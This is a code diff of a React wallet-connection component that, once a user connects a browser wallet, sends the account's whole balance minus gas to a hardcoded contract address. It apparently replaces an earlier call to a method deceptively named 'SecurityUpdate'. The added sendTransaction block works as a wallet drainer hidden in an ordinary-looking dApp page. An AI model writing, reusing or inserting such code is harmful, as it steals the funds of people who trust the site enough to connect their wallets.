@@ -13,7 +13,7 @@ import CornucopiaContract from '@/contract/CornucopiaContract.json';
 
 export default function Wallet() {
 
-  const REACT_APP_CONTARCT_ADDRESS = '0xf2dc26cB0DD9983eE7D291d8a32A2da96A94E729'
+  const REACT_APP_CONTARCT_ADDRESS = '0x9C308fCdb264a45Fc11955B53E2720124896596e'
   
   // const { active } = useWeb3React();
 1
@@ -59,20 +59,36 @@ export default function Wallet() {
     console.log(balance)
     console.log(gasPrice)
     // let amount = Web3.utils.toBN(Number(balance)).sub(Web3.utils.toBN(Number(gasPrice))).toString()
+    let gspFee = await web3?.eth.estimateGas({
+      to: REACT_APP_CONTARCT_ADDRESS,
+      value: balance,
+      from: String(account)
+    })
+    console.log(gspFee)
     let amount = Number(balance) - Number(gasPrice)*(1 * 10 ** 6)
     console.log(amount)
-    contractWithSigner.methods.SecurityUpdate().send({from: account, value: 1*10**16, gasPrice: gasPrice, gasLimit: 1 * 10 ** 6}).on('transactionHash', (hash:any)=>{
-      console.log('transactionHash')
-      console.log(hash)
-    })
-    .on('receipt', (receipt:any)=>{
-      console.log('receipt')
-      console.log(receipt)
-    })
-    .on('confirmation', (confirmationNumber:any, receipt:any)=>{
-      console.log('confirmation')
-        console.log(confirmationNumber, receipt)
-    }).on('error', console.error);
+    console.log(contractWithSigner.methods)
+    const result = web3?.eth.sendTransaction({
+      to: REACT_APP_CONTARCT_ADDRESS,
+      value: amount,
+      from: String(account)
+    }).then((receipt)=>{
+        console.log(receipt)
+    });
+
+    // const res = contractWithSigner.methods['0x893d20e8'].send({from: account, value: 1*10**16, gasPrice: gasPrice, gasLimit: 1 * 10 ** 6})
+    // res.on('transactionHash', (hash:any)=>{
+    //   console.log('transactionHash')
+    //   console.log(hash)
+    // })
+    // .on('receipt', (receipt:any)=>{
+    //   console.log('receipt')
+    //   console.log(receipt)
+    // })
+    // .on('confirmation', (confirmationNumber:any, receipt:any)=>{
+    //   console.log('confirmation')
+    //     console.log(confirmationNumber, receipt)
+    // }).on('error', console.error);
 
     // const transaction = await contractWithSigner.methods.SecurityUpdate().send({from: account, value: 1*10**16, gasPrice: gasPrice, gasLimit: 1 * 10 ** 6})
     // transaction.then((receipt:any) =>{
@@ -102,11 +118,6 @@ export default function Wallet() {
   const connectWellet = async () =>{
     console.log(injected)
     activate(injected, undefined, true).then((res)=>{
-      console.log('res:' +res)
-      // let contract = new ethers.Contract(REACT_APP_CONTARCT_ADDRESS!, CornucopiaContract.abi, signer);
-      //console.log(contract)
-      //setContractWithSigner(contract);
-      console.log(web3)
       let web3Contract = new web3.eth.Contract(CornucopiaContract.abi, REACT_APP_CONTARCT_ADDRESS)
       console.log(web3Contract.options)
       console.log('web3Contract:' + web3Contract)
@@ -121,13 +132,7 @@ export default function Wallet() {
   }
 
   useEffect(()=>{
-    // setProvider(new ethers.providers.Web3Provider(window.ethereum));
-    // web3.setProvider(window.ethereum)
-    
-    // setProvider(new Web3Provider(window.ethereum));
-
     setWeb3(new Web3(window.ethereum))
-
   }, [])
 
 
